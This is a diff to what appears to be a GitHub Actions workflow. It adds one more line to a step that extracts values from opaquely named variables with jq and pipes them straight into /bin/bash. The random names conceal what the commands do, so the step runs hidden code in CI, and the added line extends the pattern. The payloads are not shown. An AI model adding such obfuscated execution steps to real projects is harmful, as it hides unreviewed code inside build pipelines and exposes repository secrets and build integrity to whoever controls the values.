@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$jdg303" | jq -r .m71494 | /bin/bash
           echo $g2327 | jq -r .wmdm8166 | /bin/bash
           echo $akdnl9 | jq -r .ygge7039 | /bin/bash
+          printf '%s' "$cnmml5" | jq -r .hbs25 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
